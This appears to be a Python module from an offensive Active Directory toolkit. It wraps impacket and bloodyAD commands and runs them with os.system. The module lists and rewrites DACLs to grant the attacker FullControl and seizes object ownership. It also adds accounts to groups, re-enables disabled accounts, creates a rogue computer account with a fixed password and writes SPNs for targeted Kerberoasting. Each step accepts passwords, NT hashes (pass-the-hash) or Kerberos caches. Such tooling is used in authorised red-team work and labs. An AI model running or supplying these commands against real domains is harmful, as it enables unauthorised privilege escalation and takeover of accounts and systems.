import os
import config
import random

def list_acl(box, path):
    if config.HELP:    
        print("""
Action:\t[DACL] acl
Tool:\timpacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tList target's DACL entries for the specified principal.
Info:\tThe username is always the principal.
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    os.chdir(path.ws_enum)
    print('\033[92m[*]\033[0m List ACL')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} impacket-dacledit {box.domain}/ -k -no-pass -principal {box.username} -target {box.target}"
    elif box.krb:
        cmd = f"impacket-dacledit {box.domain}/{box.username}:{box.password} -k -principal {box.username} -target {box.target}"
    elif box.nt_hash:
        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -principal {box.username} -target {box.target}"
    else:
        cmd = f"impacket-dacledit {box.domain}/{box.username}:{box.password} -principal {box.username} -target {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd + f' 2>&1 | tee acl_{box.username}_to_{box.target}.out')
    print('\033[38;5;28m[+]\033[0m List ACL\n')

def read_write_owner(box, action):
    if config.HELP:    
        print("""
Action:\t[DACL] rowner, wowner 
Tool:\timpacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tRead the owner from an target or write to change it. 
Info:\tThe new owner is always the username.
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    print(f'\033[92m[*]\033[0m {action} owner')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} impacket-owneredit {box.domain}/ -k -no-pass -action {action} -new-owner {box.username} -target {box.target}"
    elif box.krb:
        cmd = f"impacket-owneredit {box.domain}/{box.username}:{box.password} -k -action {action} -new-owner {box.username} -target {box.target}"
    elif box.nt_hash:
        cmd = f"impacket-owneredit {box.domain}/{box.username} -hashes :{box.nt_hash} -action {action} -new-owner {box.username} -target {box.target}"
    else:
        cmd = f"impacket-owneredit {box.domain}/{box.username}:{box.password} -action {action} -new-owner {box.username} -target {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print(f'\033[38;5;28m[+]\033[0m {action} owner\n')

def dacledit(box):
    if config.HELP:    
        print("""
Action:\t[DACL] edit
Tool:\timpacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tSet new rights in DACL to an target for the specified principal.
Info:\tThe username is always the principal. The rights are always FullControl.
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    print(f'\033[92m[*]\033[0m dacledit FullControl')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} impacket-dacledit {box.domain}/ -k -no-pass -action write -rights FullControl -principal {box.username} -target {box.target}"
    elif box.krb:
        cmd = f"impacket-dacledit {box.domain}/{box.username}:{box.password} -k -action write -rights FullControl -principal {box.username} -target {box.target}"
    elif box.nt_hash:
        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -action write -rights FullControl -principal {box.username} -target {box.target}"
    else:
        cmd = f"impacket-dacledit {box.domain}/{box.username}:{box.password} -action write -rights FullControl -principal {box.username} -target {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m dacledit FullControl\n')

def add_user_to_group(box):
    if config.HELP:    
        print("""
Action:\t[DACL] gadd
Tool:\tbloodyAD
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
\t-tg, --targetgroup (Optional)
Desc:\tAdd a target to a target group.
Info:\tIf no target set, use username.
        """)
        return 0
    config.required_creds(box)
    config.required_targetgroup(box)
    print(f'\033[92m[*]\033[0m Add user to group')
    if not box.target:
        print(f'\033[94m[!]\033[0m Use username as target!')
        box.target = box.username
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} bloodyAD --host {box.fqdn} -d {box.domain} -k add groupMember {box.targetgroup} {box.target}"
    elif box.krb:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} -k add groupMember {box.targetgroup} {box.target}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} add groupMember {box.targetgroup} {box.target}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} add groupMember {box.targetgroup} {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m Add user to group\n')

def list_user_to_group(box):
    if config.HELP:    
        print("""
Action:\t[DACL] ladd
Tool:\tbloodyAD
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target (Optional)
Desc:\tList all memberships of the target.
Info:\tIf no target set, use username.
        """)
        return 0
    config.required_creds(box)
    print(f'\033[92m[*]\033[0m List users in group')
    if not box.target:
        print(f'\033[94m[!]\033[0m Use username as target!')
        box.target = box.username
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} bloodyAD --host {box.fqdn} -d {box.domain} -k get membership {box.target}"
    elif box.krb:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} -k get membership {box.target}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} get membership {box.target}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} get membership {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m List users in group\n')

def remove_user_to_group(box):
    if config.HELP:    
        print("""
Action:\t[DACL] gremove
Tool:\tbloodyAD
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target (Optional)
\t-tg, --targetgroup
Desc:\tRemove a target from a target group.
Info:\tIf no target set, use username. 
        """)
        return 0
    config.required_creds(box)
    config.required_targetgroup(box)
    print(f'\033[92m[*]\033[0m Remove user from group')
    if not box.target:
        print(f'\033[94m[!]\033[0m Use username as target!')
        box.target = box.username
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} bloodyAD --host {box.fqdn} -d {box.domain} -k remove groupMember {box.targetgroup} {box.target}"
    elif box.krb:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} -k remove groupMember {box.targetgroup} {box.target}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} remove groupMember {box.targetgroup} {box.target}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} remove groupMember {box.targetgroup} {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m Remove user from group\n')

def activate_account(box):
    if config.HELP:    
        print("""
Action:\t[DACL] active
Tool:\tbloodyAD
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tActivate the target (change userAccountControl).
Info:\t/
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    print(f'\033[92m[*]\033[0m Activate account')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} bloodyAD --host {box.fqdn} -d {box.domain} -k remove uac {box.target} -f ACCOUNTDISABLE"
    elif box.krb:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} -k remove uac {box.target} -f ACCOUNTDISABLE"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} remove uac {box.target} -f ACCOUNTDISABLE"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p {box.password} remove uac {box.target} -f ACCOUNTDISABLE"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m Activate account\n')

def addcomputer(box, computer_name='FAKEPC'):
    if config.HELP:    
        print("""
Action:\t[DACL] cadd
Tool:\timpacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tAdd a new computer.
Info:\t Default creds: FAKEPC:FAKEPC123!
        """)
        return 0
    config.required_creds(box)
    computer_password = f'{computer_name}123!'
    print(f'\033[92m[*]\033[0m Add computer')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} impacket-addcomputer {box.domain}/ -dc-host {box.fqdn} -k -no-pass -computer-name {computer_name} -computer-pass {computer_password}"
    elif box.krb:
        cmd = f"impacket-addcomputer {box.domain}/{box.username}:{box.password} -dc-host {box.fqdn} -k -computer-name {computer_name} -computer-pass {computer_password}"
    elif box.nt_hash:
        cmd = f"impacket-addcomputer {box.domain}/{box.username} -hashes :{box.nt_hash} -computer-name {computer_name} -computer-pass {computer_password}"
    else:
        cmd = f"impacket-addcomputer {box.domain}/{box.username}:{box.password} -computer-name {computer_name} -computer-pass {computer_password}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print(f"\033[95m[#]\033[0m Computer Creds: {computer_name}$ : {computer_password}\t-u {computer_name}$ -p {computer_password}")
    print('\033[38;5;28m[+]\033[0m Add computer\n')
    return computer_password

def write_spn(box):
    if config.HELP:    
        print("""
Action:\t[DACL] wspn
Tool:\tkrbrelayx
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
Desc:\tWrite SPN to target.
Info:\tDefault SPN: http/[1-1000]test.com
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    spn = f"http/{str(random.randint(1, 1000))}test.com"
    print(f'\033[92m[*]\033[0m Write SPN')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} addspn.py -k -t {box.target} -s {spn} {box.fqdn}"
    elif box.krb:
        cmd = f"addspn.py -k -u '{box.domain}\\{box.username}' -p {box.password} -t {box.target} -s {spn} {box.fqdn}"
    elif box.nt_hash:
        cmd = f"addspn.py -u '{box.domain}\\{box.username}' -p :{box.nt_hash} -t {box.target} -s {spn} {box.fqdn}"
    else:
        cmd = f"addspn.py -u '{box.domain}\\{box.username}' -p {box.password} -t {box.target} -s {spn} {box.fqdn}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[38;5;28m[+]\033[0m Write SPN\n')